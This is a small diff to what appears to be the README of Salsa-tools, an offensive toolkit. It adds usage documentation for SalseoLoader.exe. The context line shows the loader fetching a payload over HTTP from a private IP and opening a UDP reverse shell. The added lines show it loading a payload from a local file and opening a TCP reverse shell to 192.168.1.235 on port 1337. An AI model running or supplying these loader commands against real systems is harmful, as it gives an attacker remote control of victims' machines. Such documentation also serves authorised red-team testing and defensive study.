@@ -113,3 +113,8 @@ SalseoLoader.exe hc0n-2019 http://192.168.1.235/elmal.txt reverseudp 192.168.1.2
 ```
 ![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example1.png)
 
+# Usage SalseoLoader in .EXE reading from local file.
+```
+SalseoLoader.exe hc0n-2019 C:\elmal.txt reversetcp 192.168.1.235 1337
+```
+![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example2.png)
